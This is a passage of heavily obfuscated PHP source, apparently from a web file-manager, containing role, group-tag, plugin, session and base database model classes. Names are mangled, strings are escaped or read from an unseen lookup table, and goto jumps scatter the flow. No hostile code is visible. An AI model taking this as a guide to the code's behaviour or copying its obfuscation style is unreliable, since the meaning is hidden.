$ƒÆ§œÁ = false) { $®—ÚÁ–Ä =& $_SERVER[µÅ˜º…æ]; $³à·— = parent::listData($ÅŸá¸íô, $Ç„€Ì‰”, $ƒÆ§œÁ); if (!$ÅŸá¸íô) { foreach ($³à·— as $â¡ ¹Ã => $¦òçø×) { if ($¦òçø×[$®—ÚÁ–Ä[2375]] == 1) { $³à·—[$â¡ ¹Ã][$®—ÚÁ–Ä[540]] = LNG($®—ÚÁ–Ä[2662]); } } } return $³à·—; } public function update($¢ÀÃ§á°, $¼ÒĞ™İ) { $×¾Ü­«÷ =& $_SERVER[µÅ˜º…æ]; $‚º½Š‰Ú = parent::listData($¢ÀÃ§á°); $°Ş§™÷¯ = $this->findByName($¼ÒĞ™İ[$×¾Ü­«÷[32]]); if (!$‚º½Š‰Ú || $°Ş§™÷¯ && $°Ş§™÷¯[$×¾Ü­«÷[487]] != $‚º½Š‰Ú[$×¾Ü­«÷[487]]) { return !1; } if ($°Ş§™÷¯[$×¾Ü­«÷[2375]] == 1) { $¼ÒĞ™İ = array($×¾Ü­«÷[32] => $¼ÒĞ™İ[$×¾Ü­«÷[32]], $×¾Ü­«÷[2202] => $¼ÒĞ™İ[$×¾Ü­«÷[2202]]); } $this->filterAuth($¼ÒĞ™İ[$×¾Ü­«÷[502]]); return parent::update($¢ÀÃ§á°, $¼ÒĞ™İ); } public function remove($ŸÅÏ–˜·) { $Ş¹Ñşó = parent::listData($ŸÅÏ–˜·); if (!$Ş¹Ñşó || $Ş¹Ñşó[$_SERVER[µÅ˜º…æ][189]]) { return !1; } return parent::remove($ŸÅÏ–˜·); } public function add($Ü‰ôòÎ°) { $‰Ğ°…İÉ =& $_SERVER[µÅ˜º…æ]; $ÃÏİû¯Ş = $Ü‰ôòÎ°[$‰Ğ°…İÉ[32]]; if ($this->findByName($ÃÏİû¯Ş)) { return !1; } $¤à¥áàÑ = array($‰Ğ°…İÉ[509] => $ÃÏİû¯Ş, $‰Ğ°…İÉ[2187] => $‰Ğ°…İÉ[12], $‰Ğ°…İÉ[2183] => $‰Ğ°…İÉ[2191], $‰Ğ°…İÉ[2663] => 1, $‰Ğ°…İÉ[2186] => 0, $‰Ğ°…İÉ[2664] => 0, $‰Ğ°…İÉ[2185] => $this->getSort()); $Ü‰ôòÎ° = array_merge($¤à¥áàÑ, $Ü‰ôòÎ°); $this->filterAuth($Ü‰ôòÎ°[$‰Ğ°…İÉ[502]]); return parent::insert($Ü‰ôòÎ°); } private function getSort() { $ùÏõû«É =& $_SERVER[µÅ˜º…æ]; $‰äÚŸ§Ã = parent::listData(); $¾Úäƒ»ß = array_to_keyvalue($‰äÚŸ§Ã, $ùÏõû«É[12], $ùÏõû«É[2203]); return empty($¾Úäƒ»ß) ? 0 : max($¾Úäƒ»ß) + 1; } private function filterAuth(&$ÍéÏ×İª) { $“ÖéÁäÈ =& $_SERVER[µÅ˜º…æ]; $×²»Şõ¹ = array(); $ï›â’çÜ = array_filter(explode($“ÖéÁäÈ[50], $ÍéÏ×İª)); foreach ($ï›â’çÜ as $ÍéÏ×İª) { $¿ú³²ïÂ = explode($“ÖéÁäÈ[10], $ÍéÏ×İª); if ($¿ú³²ïÂ[0] == $“ÖéÁäÈ[2665] && $¿ú³²ïÂ[1] != $“ÖéÁäÈ[1310]) { $µÉöñŠ• = $¿ú³²ïÂ[0] . $“ÖéÁäÈ[10] . $¿ú³²ïÂ[1] . $“ÖéÁäÈ[2666]; if (!in_array($µÉöñŠ•, $ï›â’çÜ)) { $×²»Şõ¹[] = $µÉöñŠ•; } } $×²»Şõ¹[] = $ÍéÏ×İª; } $ÍéÏ×İª = implode($“ÖéÁäÈ[50], $×²»Şõ¹); } public function findRoleDefault() { $²Ïòşğ =& $_SERVER[µÅ˜º…æ]; $è…àí¯Ò = parent::listData(); $óŠ•í½à = !1; foreach ($è…àí¯Ò as $™ôÁû™) { if (!$™ôÁû™ || $™ôÁû™[$²Ïòşğ[2201]] == $²Ïòşğ[228] || $™ôÁû™[$²Ïòşğ[2375]] == 1) { continue; } if (strstr($™ôÁû™[$²Ïòşğ[502]], $²Ïòşğ[2667])) { continue; } if (!strstr($™ôÁû™[$²Ïòşğ[502]], $²Ïòşğ[2668])) { continue; } if (!$óŠ•í½à) { $óŠ•í½à = $™ôÁû™; continue; } $€îûóÉä = explode($²Ïòşğ[50], $óŠ•í½à[$²Ïòşğ[502]]); $˜¢¶Ÿ®ì = explode($²Ïòşğ[50], $™ôÁû™[$²Ïòşğ[502]]); if (count($€îûóÉä) > count($˜¢¶Ÿ®ì)) { $óŠ•í½à = $™ôÁû™; } } return $óŠ•í½à ? $óŠ•í½à[$²Ïòşğ[487]] : $²Ïòşğ[12]; } public function sort($ê¯ƒÈê, $öÎùÆ‰) { return parent::update($ê¯ƒÈê, $öÎùÆ‰); } } goto CÔª±††ä“; eÎ×ê¢ÏĞ: define($_SERVER[µÅ˜º…æ][317], 3); define($_SERVER[µÅ˜º…æ][318], 1); define($_SERVER[µÅ˜º…æ][319], 0); goto F”øŒ´–; cÇ‚¼ïÚõ: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($Üù€Ò·†) { $®ª´®éˆ =& $_SERVER[µÅ˜º…æ]; return array($®ª´®éˆ[2293] => array($Üù€Ò·†[0], $®ª´®éˆ[2294]), $®ª´®éˆ[2295] => array($Üù€Ò·†[0], $®ª´®éˆ[2296])); } protected function ___get($—ÔºÃğ£) { $Ş·İ‡šƒ =& $_SERVER[µÅ˜º…æ]; $ºïîå¯Ğ = Model($Ş·İ‡šƒ[605])->metaGet($—ÔºÃğ£, $Ş·İ‡šƒ[2297]); $ğÇŸ¹ù² = json_decode($ºïîå¯Ğ, !0); return $ğÇŸ¹ù² ? $ğÇŸ¹ù² : array($Ş·İ‡šƒ[2298] => $Ş·İ‡šƒ[91], $Ş·İ‡šƒ[446] => array()); } protected function ___listData($¿‘¬ø·Î) { $¶Íå×û“ =& $_SERVER[µÅ˜º…æ]; $ÏšŠÔ¾ = array($¶Íå×û“[1967] => 0, $¶Íå×û“[573] => array($¶Íå×û“[2299], 0), $¶Íå×û“[511] => $¶Íå×û“[1492] . $¿‘¬ø·Î); $¾€ÈÜ‰ğ = $¶Íå×û“[2300]; $€ëâ™â = $this->field($¾€ÈÜ‰ğ)->where($ÏšŠÔ¾)->order($¶Íå×û“[2301])->select(); return $€ëâ™â ? $€ëâ™â : array(); } protected function set($ğÀç»Æ‹, $İ½ÜïÑ) { $ù¨ÔÉæ =& $_SERVER[µÅ˜º…æ]; $İ½ÜïÑ = $İ½ÜïÑ ? $İ½ÜïÑ : array($ù¨ÔÉæ[2298] => $ù¨ÔÉæ[91], $ù¨ÔÉæ[446] => array()); return Model($ù¨ÔÉæ[605])->metaSet($ğÀç»Æ‹, $ù¨ÔÉæ[2297], json_encode($İ½ÜïÑ)); } protected function getByTagID($Û¯¦à¬, $ª¹ş©æş) { $ÖŸñÍ€» =& $_SERVER[µÅ˜º…æ]; if (!$Û¯¦à¬ || !$ª¹ş©æş) { return !1; } if (!Model($ÖŸñÍ€»[605])->getInfoSimple($Û¯¦à¬)) { return !1; } $øó—Ì±Â = $this->get($Û¯¦à¬); if (!$øó—Ì±Â || !isset($øó—Ì±Â[$ÖŸñÍ€»[446]])) { return !1; } $šœÑÇÒ = array_find_by_field($øó—Ì±Â[$ÖŸñÍ€»[446]], $ÖŸñÍ€»[487], $ª¹ş©æş); return is_array($šœÑÇÒ) ? $šœÑÇÒ : !1; } public function listSource($€åŞíú, $—Íú‘ä) { $®ÅãÆˆŞ =& $_SERVER[µÅ˜º…æ]; if ($—Íú‘ä && !is_array($—Íú‘ä)) { $—Íú‘ä = array($—Íú‘ä); } $’Í¿Ùéæ = $this->get($€åŞíú); $À©Ùµç­ = array_to_keyvalue($’Í¿Ùéæ[$®ÅãÆˆŞ[446]], $®ÅãÆˆŞ[487]); $Æ†«†‰Ç = array_to_keyvalue($’Í¿Ùéæ[$®ÅãÆˆŞ[598]], $®ÅãÆˆŞ[487]); $ö¶ Óï¢ = $this->listData($€åŞíú); $‘´ úãæ = array(); foreach ($—Íú‘ä as $–ÇÇïØØ) { $ÒõŠÔñï = $À©Ùµç­[$–ÇÇïØØ]; $½‹—´é = _get($ÒõŠÔñï, $®ÅãÆˆŞ[598]); if (!$ÒõŠÔñï || !$½‹—´é || !$Æ†«†‰Ç[$½‹—´é]) { continue; } if (!$‘´ úãæ[$½‹—´é]) { $‘´ úãæ[$½‹—´é] = array(); } $‘´ úãæ[$½‹—´é][] = $–ÇÇïØØ; } $Ú‡ıÜç = array(); $ÜáøØÌ = array(); foreach ($ö¶ Óï¢ as $ñŸ»Ì¥î) { $‹¦³§¦é = $ñŸ»Ì¥î[$®ÅãÆˆŞ[87]]; $ÒõŠÔñï = $À©Ùµç­[$ñŸ»Ì¥î[$®ÅãÆˆŞ[515]]]; $½‹—´é = _get($ÒõŠÔñï, $®ÅãÆˆŞ[598]); if (!$ÒõŠÔñï || !$½‹—´é || !$‘´ úãæ[$½‹—´é] || !$‹¦³§¦é) { continue; } if (!in_array($ñŸ»Ì¥î[$®ÅãÆˆŞ[515]], $‘´ úãæ[$½‹—´é])) { continue; } if (!$Ú‡ıÜç[$‹¦³§¦é]) { $Ú‡ıÜç[$‹¦³§¦é] = array(); } $Ú‡ıÜç[$‹¦³§¦é][] = $½‹—´é; } foreach ($Ú‡ıÜç as $‹¦³§¦é => $İ¿Í×ë) { if (count($İ¿Í×ë) != count($‘´ úãæ)) { continue; } $ÜáøØÌ[] = $‹¦³§¦é; } if (!$—Íú‘ä) { $ÜáøØÌ = array_to_keyvalue($ö¶ Óï¢, $®ÅãÆˆŞ[12], $®ÅãÆˆŞ[87]); } $ÜáøØÌ = array_unique($ÜáøØÌ); if (!$ÜáøØÌ) { return array(); } $Íá³ˆà³ = array($®ÅãÆˆŞ[506] => array($®ÅãÆˆŞ[507], $ÜáøØÌ), $®ÅãÆˆŞ[589] => $€åŞíú, $®ÅãÆˆŞ[188] => SourceModel::TYPE_GROUP); $ıÌ­àÀÁ = Model($®ÅãÆˆŞ[1534])->listSource($Íá³ˆà³); if (!$ıÌ­àÀÁ || count($ÜáøØÌ) == $ıÌ­àÀÁ[$®ÅãÆˆŞ[443]][$®ÅãÆˆŞ[444]]) { return $ıÌ­àÀÁ; } $³¥íÀ = array(); $í¶ÅÉ— = array_to_keyvalue($ıÌ­àÀÁ[$®ÅãÆˆŞ[85]], $®ÅãÆˆŞ[12], $®ÅãÆˆŞ[191]); $ƒàíÅ¦Ì = array_to_keyvalue($ıÌ­àÀÁ[$®ÅãÆˆŞ[86]], $®ÅãÆˆŞ[12], $®ÅãÆˆŞ[191]); $·„á¯Ñì = array_merge($ƒàíÅ¦Ì, $í¶ÅÉ—); foreach ($ÜáøØÌ as $‹¦³§¦é) { if (!in_array($‹¦³§¦é, $·„á¯Ñì)) { $³¥íÀ[] = $‹¦³§¦é; } } if ($³¥íÀ) { $this->removeBySource($€åŞíú, $³¥íÀ); } return $ıÌ­àÀÁ; } protected function addToTag($¶é‚Óó, $¢—ü¸®Ğ, $´äÃ»µ­) { $ÕÑÍ®Âî =& $_SERVER[µÅ˜º…æ]; if (!$this->getByTagID($¶é‚Óó, $´äÃ»µ­) || !$¢—ü¸®Ğ) { return !1; } if (!Model($ÕÑÍ®Âî[932])->pathInfo($¢—ü¸®Ğ)) { return !1; } $¢ µ™µ = array($ÕÑÍ®Âî[1967] => 0, $ÕÑÍ®Âî[573] => $´äÃ»µ­, $ÕÑÍ®Âî[510] => $¢—ü¸®Ğ, $ÕÑÍ®Âî[511] => $ÕÑÍ®Âî[2302] . $¶é‚Óó, $ÕÑÍ®Âî[509] => $ÕÑÍ®Âî[12], $ÕÑÍ®Âî[2185] => 0); if ($this->where($¢ µ™µ)->find()) { return !1; } return $this->add($¢ µ™µ); } protected function removeFromTag($Ú•°ìùÁ, $à‹â¤‡­, $Ò« â¤Ù) { $˜®Ü® =& $_SERVER[µÅ˜º…æ]; if (!$this->getByTagID($Ú•°ìùÁ, $Ò« â¤Ù) || !$à‹â¤‡­) { return !1; } if (is_array($à‹â¤‡­)) { $à‹â¤‡­ = array($˜®Ü®[7], $à‹â¤‡­); } $ú¦¹ØÒÁ = array($˜®Ü®[1967] => 0, $˜®Ü®[573] => $Ò« â¤Ù, $˜®Ü®[511] => $˜®Ü®[2302] . $Ú•°ìùÁ, $˜®Ü®[510] => $à‹â¤‡­); return $this->where($ú¦¹ØÒÁ)->delete(); } protected function removeByTag($ØßäœÇ, $íˆ…¢„) { $µˆÙÂ“ =& $_SERVER[µÅ˜º…æ]; if (!$this->getByTagID($ØßäœÇ, $íˆ…¢„)) { return !1; } $£×©óĞ = array($µˆÙÂ“[1967] => 0, $µˆÙÂ“[573] => $íˆ…¢„, $µˆÙÂ“[511] => $µˆÙÂ“[2302] . $ØßäœÇ); return $this->where($£×©óĞ)->delete(); } protected function removeBySource($±¢”ÃÚÔ, $†®…’·) { $âñÔ¨ =& $_SERVER[µÅ˜º…æ]; if (!$±¢”ÃÚÔ || !$†®…’·) { return !1; } if (is_array($†®…’·)) { $†®…’· = array($âñÔ¨[7], $†®…’·); } $’ğÇëÙÖ = array($âñÔ¨[1967] => 0, $âñÔ¨[510] => $†®…’·, $âñÔ¨[573] => array($âñÔ¨[1183], 0), $âñÔ¨[511] => $âñÔ¨[2302] . $±¢”ÃÚÔ); return $this->where($’ğÇëÙÖ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\x70\154\165\x67\x69\156\114\x69\x73\164"; public $field = array("\156\x61\155\145", "\x73\164\x61\x74\165\x73", "\162\x65\147\x69\145\x73\x74", "\x63\x6f\156\x66\151\x67"); public function loadList($óƒ§Í²µ = false) { $¬œ¶¬œè = array_to_keyvalue($this->listData(), $_SERVER[µÅ˜º…æ][32]); if ($óƒ§Í²µ) { return $¬œ¶¬œè[$óƒ§Í²µ]; } return $¬œ¶¬œè; } public function init() { $šç‡³Œ =& $_SERVER[µÅ˜º…æ]; Hook::trigger($šç‡³Œ[2303]); $ÔÌ—¢ÓÌ = $this->loadPluginList(); foreach ($ÔÌ—¢ÓÌ as $š—‘‹åô => $Š™ü¾¦Õ) { $Í¾“§á¡ = $this->appAllow($š—‘‹åô, $Š™ü¾¦Õ); if (!$Í¾“§á¡) { continue; } foreach ($Š™ü¾¦Õ[$šç‡³Œ[2304]] as $Íé…ÄÃÚ => $¹È¤€) { Hook::bind($Íé…ÄÃÚ, $¹È¤€); } } Hook::trigger($šç‡³Œ[2305]); Hook::trigger(ACTION); } public function appAllow($Ş©”ÄÏş, $…Åä¡¼×, $±ñ×úáÊ = true) { $çŞ›À“ =& $_SERVER[µÅ˜º…æ]; $ØŒŞ×Ú¢ = PLUGIN_DIR . $Ş©”ÄÏş . $çŞ›À“[2306]; if (!is_array($…Åä¡¼×) || !is_array($…Åä¡¼×[$çŞ›À“[2304]]) || $…Åä¡¼×[$çŞ›À“[849]] != 1 || !is_file($ØŒŞ×Ú¢)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$çŞ›À“[6]][$çŞ›À“[2307]] || !$GLOBALS[$çŞ›À“[6]][$çŞ›À“[2308]]) { return !0; } $¨õ¾Åâ = explode($çŞ›À“[50], strtolower($GLOBALS[$çŞ›À“[6]][$çŞ›À“[2308]])); return in_array(strtolower($Ş©”ÄÏş), $¨õ¾Åâ) ? !1 : !0; } if ($±ñ×úáÊ && !Action($çŞ›À“[2309])->checkAuth($Ş©”ÄÏş)) { return !1; } return !0; } public function unInstall($ã¼”¿ä) { $·‚İ¶‹£ =& $_SERVER[µÅ˜º…æ]; $ÑúÙ¿Èš = $this->loadList($ã¼”¿ä); if (file_exists(PLUGIN_DIR . $ã¼”¿ä)) { Hook::apply($ã¼”¿ä . $·‚İ¶‹£[2310]); } $this->remove($ÑúÙ¿Èš[$·‚İ¶‹£[487]]); } public function changeStatus($¢ƒ—µñì, $ó½º”Ù¹) { $€ÚÜšß =& $_SERVER[µÅ˜º…æ]; $ÕÔÓãèï = $this->loadList($¢ƒ—µñì); if ($ó½º”Ù¹) { Hook::apply($¢ƒ—µñì . $€ÚÜšß[2311]); } $this->update($ÕÔÓãèï[$€ÚÜšß[487]], array($€ÚÜšß[2312] => $ó½º”Ù¹)); } public function appRegist($¿‚±…œÈ, $İÕÃıßª) { $¥èŞ€´Ï =& $_SERVER[µÅ˜º…æ]; $½·Û”œÊ = $this->loadList($¿‚±…œÈ); if ($½·Û”œÊ) { $this->update($½·Û”œÊ[$¥èŞ€´Ï[487]], array($¥èŞ€´Ï[2304] => $İÕÃıßª)); } else { $ÎÎËÔˆ = array($¥èŞ€´Ï[32] => $¿‚±…œÈ, $¥èŞ€´Ï[2304] => $İÕÃıßª, $¥èŞ€´Ï[849] => 0, $¥èŞ€´Ï[6] => $this->getConfigDefault($¿‚±…œÈ)); $this->insert($ÎÎËÔˆ); } } public function getConfigDefault($˜ç¬â«¯) { $ßúú¾¤´ =& $_SERVER[µÅ˜º…æ]; $¹ªêÙĞÛ = array(); $Êñ´¾Äì = $this->getPackageJson($˜ç¬â«¯); if (!$Êñ´¾Äì && is_array($Êñ´¾Äì[$ßúú¾¤´[2313]])) { return $¹ªêÙĞÛ; } foreach ($Êñ´¾Äì[$ßúú¾¤´[2313]] as $§×®¬‰ => $ÆÛÊ‚á) { if (!isset($ÆÛÊ‚á[$ßúú¾¤´[451]]) || isset($¹ªêÙĞÛ[$§×®¬‰])) { continue; } $¹ªêÙĞÛ[$§×®¬‰] = $ÆÛÊ‚á[$ßúú¾¤´[451]]; } return $¹ªêÙĞÛ; } public function getPackageJson($©ÇÌüû¿) { return Hook::apply($©ÇÌüû¿ . $_SERVER[µÅ˜º…æ][2314]); } public function getConfig($–ÀÂÔ”ó, $ñ°Ïøæ = false) { $‰àÃÎ– =& $_SERVER[µÅ˜º…æ]; $¦åÁ¹­¬ = array(); $ÔÆ¯çÆ¡ = $this->loadList($–ÀÂÔ”ó); if ($ÔÆ¯çÆ¡ && is_array($ÔÆ¯çÆ¡[$‰àÃÎ–[6]])) { $¦åÁ¹­¬ = $ÔÆ¯çÆ¡[$‰àÃÎ–[6]]; } if (!$¦åÁ¹­¬ || $ñ°Ïøæ) { $¦åÁ¹­¬ = $this->getConfigDefault($–ÀÂÔ”ó); } return $¦åÁ¹­¬; } public function setConfig($……ö®ÓÑ, $Öó‰›ğ† = false) { $±® Ñ¬› =& $_SERVER[µÅ˜º…æ]; $ãäù‹áİ = $this->loadList($……ö®ÓÑ); if (!$ãäù‹áİ) { return !1; } $™£ãç”† = $ãäù‹áİ[$±® Ñ¬›[6]]; if ($Öó‰›ğ† == !1) { $™£ãç”† = array(); $Öó‰›ğ† = $this->getConfigDefault($……ö®ÓÑ); } foreach ($Öó‰›ğ† as $ÃÚ°œû => $åÔÀÉ¡¡) { $™£ãç”†[$ÃÚ°œû] = is_string($åÔÀÉ¡¡) ? trim($åÔÀÉ¡¡) : $åÔÀÉ¡¡; } $this->update($ãäù‹áİ[$±® Ñ¬›[487]], array($±® Ñ¬›[6] => $™£ãç”†)); } public function viewList() { $Í° Á÷ =& $_SERVER[µÅ˜º…æ]; $ÖÂ¼ú·ñ = $this->loadList(); $this->pluginScan($ÖÂ¼ú·ñ); $ÖÂ¼ú·ñ = $this->loadPluginList(); $öø ¼ù = array(); foreach ($ÖÂ¼ú·ñ as $ÌûÚó¼± => $´ôöÒÊ) { $Š€Û¤á‡ = $´ôöÒÊ; unset($´ôöÒÊ[$Í° Á÷[2304]], $´ôöÒÊ[$Í° Á÷[6]]); $ÅíÒÒíö = PLUGIN_DIR . $´ôöÒÊ[$Í° Á÷[32]] . $Í° Á÷[2306]; if (!is_file($ÅíÒÒíö)) { continue; } $—±¦ÁÏÜ = Hook::apply($´ôöÒÊ[$Í° Á÷[32]] . $Í° Á÷[2314]); if (!is_array($—±¦ÁÏÜ)) { continue; } $öø ¼ù[$ÌûÚó¼±] = array_merge($´ôöÒÊ, $—±¦ÁÏÜ); if ($Š€Û¤á‡[$Í° Á÷[6]][$Í° Á÷[1890]] != $—±¦ÁÏÜ[$Í° Á÷[1864]]) { Hook::apply($´ôöÒÊ[$Í° Á÷[32]] . $Í° Á÷[2311]); $Š€Û¤á‡[$Í° Á÷[6]][$Í° Á÷[1890]] = $—±¦ÁÏÜ[$Í° Á÷[1864]]; $this->update($´ôöÒÊ[$Í° Á÷[487]], array($Í° Á÷[6] => $Š€Û¤á‡[$Í° Á÷[6]])); } } return $öø ¼ù; } private function loadPluginList() { $–ş¦ïãè =& $_SERVER[µÅ˜º…æ]; $š÷„’ŠÁ = $this->loadList(); if (strtolower(MOD) == $–ş¦ïãè[2315]) { return $š÷„’ŠÁ; } $’œı™˜ = Hook::trigger($–ş¦ïãè[2316], $š÷„’ŠÁ); if ($š÷„’ŠÁ && !$’œı™˜) { die; } return $’œı™˜ ? $’œı™˜ : $š÷„’ŠÁ; } private function pluginScan($„ÆÍÊîñ) { $øÑ¨ºœ =& $_SERVER[µÅ˜º…æ]; recursion_dir(PLUGIN_DIR, $Ì°ö¤‡Ä, $•œŞò€, 0); foreach ($Ì°ö¤‡Ä as $ÏÕÇ«¦ß) { $õ×¹ŸÅ— = get_path_this($ÏÕÇ«¦ß); if (isset($„ÆÍÊîñ[$õ×¹ŸÅ—]) || !file_exists($ÏÕÇ«¦ß . $øÑ¨ºœ[2317]) || !file_exists($ÏÕÇ«¦ß . $øÑ¨ºœ[2306])) { continue; } Hook::apply($õ×¹ŸÅ— . $øÑ¨ºœ[2311]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\x6d\137\163\145\x73\x73\151\157\156"; public function get($àÚö½¿í) { $µ¨¢êû” =& $_SERVER[µÅ˜º…æ]; $Îí¨›ˆ— = $this->where(array($µ¨¢êû”[2318] => $àÚö½¿í))->find(); if (!is_array($Îí¨›ˆ—)) { return !1; } return $Îí¨›ˆ—[$µ¨¢êû”[168]]; } public function set($à¬ı½ÄŒ, $¨Ğ—òÒ, $ØÒ˜İ§¤ = 3600) { $¡¯àş¡ =& $_SERVER[µÅ˜º…æ]; $Ü—Ìƒß† = array($¡¯àş¡[2318] => $à¬ı½ÄŒ, $¡¯àş¡[2221] => $¨Ğ—òÒ, $¡¯àş¡[2319] => $ØÒ˜İ§¤ + time()); if (Session::get($¡¯àş¡[2320])) { $Ü—Ìƒß†[$¡¯àş¡[1593]] = Session::get($¡¯àş¡[2320]); } else { $Ü—Ìƒß†[$¡¯àş¡[1593]] = 0; } if ($this->get($à¬ı½ÄŒ)) { return $this->where(array($¡¯àş¡[2318] => $à¬ı½ÄŒ))->save($Ü—Ìƒß†); } else { return $this->add($Ü—Ìƒß†, array(), !0); } } public function remove($ã…Ô®–Ñ) { return $this->where(array($_SERVER[µÅ˜º…æ][2318] => $ã…Ô®–Ñ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[µÅ˜º…æ][2321] . time())->delete(); } } goto F´¶ëÀàó£; F”øŒ´–: define($_SERVER[µÅ˜º…æ][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\157\162\144\145\x72", "\x61\154\151\141\x73", "\x68\141\x76\151\x6e\147", "\x67\162\x6f\165\160", "\x6c\x6f\x63\153", "\x64\x69\163\164\151\x6e\143\164", "\x61\x75\164\x6f", "\x66\151\x6c\x74\145\x72", "\x76\141\154\x69\144\x61\x74\x65", "\x72\145\x73\x75\154\x74", "\142\x69\x6e\144", "\x74\157\x6b\x65\x6e"); public function __construct($äŞŠç—õ = '', $Õåºú = '', $“°îÜÚ² = '') { $ÍÚÇå˜ =& $_SERVER[µÅ˜º…æ]; $this->_initialize(); if (!empty($äŞŠç—õ)) { if (strpos($äŞŠç—õ, $ÍÚÇå˜[10])) { list($this->dbName, $this->name) = explode($ÍÚÇå˜[10], $äŞŠç—õ); } else { $this->name = $äŞŠç—õ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Õåºú)) { $this->tablePrefix = $ÍÚÇå˜[12]; } elseif ($ÍÚÇå˜[12] != $Õåºú) { $this->tablePrefix = $Õåºú; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÍÚÇå˜[321]); } $this->db(0, empty($this->connection) ? $“°îÜÚ² : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $äŠ®¯¢± =& $_SERVER[µÅ˜º…æ]; if (empty($this->fields)) { if (think_config($äŠ®¯¢±[322])) { $©ĞéıºÓ = $this->dbName ? $this->dbName : think_config($äŠ®¯¢±[323]); $³­†Š¥ì = think_var_cache($äŠ®¯¢±[324] . strtolower(get_path_this($©ĞéıºÓ) . $äŠ®¯¢±[10] . $this->name)); if ($³­†Š¥ì) { $½íïªÀ’ = think_config($äŠ®¯¢±[325]); if (empty($½íïªÀ’) || $³­†Š¥ì[$äŠ®¯¢±[326]] == $½íïªÀ’) { $this->fields = $³­†Š¥ì; return; } } } $this->flush(); } } public function flush() { $‡Ì²ä—å =& $_SERVER[µÅ˜º…æ]; $this->db->setModel($this->name); $õ°Ì¦š® = $this->db->getFields($this->getTableName()); if (!$õ°Ì¦š®) { return !1; } $this->fields = array_keys($õ°Ì¦š®); $this->fields[$‡Ì²ä—å[327]] = !1; foreach ($õ°Ì¦š® as $ëûœÄİõ => $×ˆØ›æ·) { $Ò¼¦ÙÑ½[$ëûœÄİõ] = $×ˆØ›æ·[$‡Ì²ä—å[33]]; if ($×ˆØ›æ·[$‡Ì²ä—å[39]]) { $this->fields[$‡Ì²ä—å[328]] = $ëûœÄİõ; if ($×ˆØ›æ·[$‡Ì²ä—å[42]]) { $this->fields[$‡Ì²ä—å[327]] = !0; } } } $this->fields[$‡Ì²ä—å[329]] = $Ò¼¦ÙÑ½; if (think_config($‡Ì²ä—å[325])) { $this->fields[$‡Ì²ä—å[326]] = think_config($‡Ì²ä—å[325]); } if (think_config($‡Ì²ä—å[322])) { $ŠÑƒï¹¤ = $this->dbName ? $this->dbName : think_config($‡Ì²ä—å[323]); think_var_cache($‡Ì²ä—å[324] . strtolower(get_path_this($ŠÑƒï¹¤) . $‡Ì²ä—å[10] . $this->name), $this->fields); } } public function switchModel($ôºÕ±…, $£ÅåÖ½ë = array()) { $õ¶ÓÍâ =& $_SERVER[µÅ˜º…æ]; $÷øé¡˜ğ = ucwords(strtolower($ôºÕ±…)) . $õ¶ÓÍâ[330]; if (!class_exists($÷øé¡˜ğ)) { think_exception($÷øé¡˜ğ . think_lang($õ¶ÓÍâ[331])); } $this->_extModel = new $÷øé¡˜ğ($this->name); if (!empty($£ÅåÖ½ë)) { foreach ($£ÅåÖ½ë as $ˆƒÅ‡¾) { $this->_extModel->setProperty($ˆƒÅ‡¾, $this->{$ˆƒÅ‡¾}); } } return $this->_extModel; } public function __set($ıØšüÊÕ, $Œ†é×¸Õ) { $this->data[$ıØšüÊÕ] = $Œ†é×¸Õ; } public function __get($ÖğŠ°©í) { return isset($this->data[$ÖğŠ°©í]) ? $this->data[$ÖğŠ°©í] : null; } public function __isset($˜ˆşåÔ‰) { return isset($this->data[$˜ˆşåÔ‰]); } public function __unset($Ø©ß¥Öƒ) { unset($this->data[$Ø©ß¥Öƒ]); } public function __call($Êô’Ï¡‚, $ğ¾çŠóü) { $ëÂˆ‚¤à =& $_SERVER[µÅ˜º…æ]; if (in_array(strtolower($Êô’Ï¡‚), $this->methods, !0)) { $this->options[strtolower($Êô’Ï¡‚)] = $ğ¾çŠóü[0]; return $this; } elseif (in_array(strtolower($Êô’Ï¡‚), array($ëÂˆ‚¤à[332], $ëÂˆ‚¤à[333], $ëÂˆ‚¤à[334], $ëÂˆ‚¤à[335], $ëÂˆ‚¤à[336]), !0)) { $é¥ÒšÌç = isset($ğ¾çŠóü[0]) ? $ğ¾çŠóü[0] : $ëÂˆ‚¤à[220]; $é¥ÒšÌç = $this->db->parseKey($é¥ÒšÌç); return $this->getField(strtoupper($Êô’Ï¡‚) . $ëÂˆ‚¤à[337] . $é¥ÒšÌç . $ëÂˆ‚¤à[338] . $Êô’Ï¡‚, $ëÂˆ‚¤à[332]); } elseif (strtolower(substr($Êô’Ï¡‚, 0, 5)) == $ëÂˆ‚¤à[339]) { $é¥ÒšÌç = think_parse_name(substr($Êô’Ï¡‚, 5)); $€ó¢§óÅ[$é¥ÒšÌç] = $ğ¾çŠóü[0]; return $this->where($€ó¢§óÅ)->find(); } elseif (strtolower(substr($Êô’Ï¡‚, 0, 10)) == $ëÂˆ‚¤à[340]) { $Îï¯¨¨Ä = think_parse_name(substr($Êô’Ï¡‚, 10)); $€ó¢§óÅ[$Îï¯¨¨Ä] = $ğ¾çŠóü[0]; return $this->where($€ó¢§óÅ)->getField($ğ¾çŠóü[1]); } elseif (isset($this->_scope[$Êô’Ï¡‚])) { return $this->scope($Êô’Ï¡‚, $ğ¾çŠóü[0]); } elseif (method_exists($this, $Êô’Ï¡‚) || method_exists($this, $ëÂˆ‚¤à[341] . $Êô’Ï¡‚)) { array_unshift($ğ¾çŠóü, $Êô’Ï¡‚); return call_user_func_array(array($this, $ëÂˆ‚¤à[342]), $ğ¾çŠóü); } else { return call_user_func_array(array(parent, $Êô’Ï¡‚), 